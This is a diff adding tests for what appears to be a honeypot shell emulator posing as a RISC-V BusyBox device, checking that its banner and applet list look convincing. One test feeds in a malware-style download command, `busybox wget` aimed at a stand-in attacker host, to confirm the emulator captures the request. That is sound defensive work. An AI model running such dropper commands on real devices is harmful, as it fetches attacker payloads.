@@ -331,3 +331,35 @@ def test_mount_bare_shows_fake_table():
 def test_mount_with_args_is_a_silent_noop():
     result = dispatch("mount /dev/sda1 /mnt", _fs(), PersonaConfig(arch="riscv64"))
     assert result.output == ""
+
+
+# -- bare `busybox` invocation --------------------------------------------
+
+def test_busybox_bare_shows_banner_and_function_list():
+    result = dispatch("busybox", _fs(), PersonaConfig(arch="riscv64"))
+    assert result.output.startswith("BusyBox v")
+    assert "Currently defined functions:" in result.output
+    assert "wget" in result.output
+
+
+def test_busybox_help_shows_same_banner_not_unknown_command():
+    result = dispatch("busybox --help", _fs(), PersonaConfig(arch="riscv64"))
+    assert result.output.startswith("BusyBox v")
+
+
+def test_busybox_list_prints_one_applet_per_line():
+    result = dispatch("busybox --list", _fs(), PersonaConfig(arch="riscv64"))
+    lines = result.output.splitlines()
+    assert "wget" in lines
+    assert "ls" in lines
+
+
+def test_busybox_list_full_prints_paths():
+    result = dispatch("busybox --list-full", _fs(), PersonaConfig(arch="riscv64"))
+    assert "/bin/wget" in result.output.splitlines()
+
+
+def test_busybox_applet_unwrap_still_works():
+    result = dispatch("busybox wget http://evil.example/x", _fs(), PersonaConfig(arch="riscv64"))
+    assert result.download_request is not None
+    assert result.download_request.url == "http://evil.example/x"
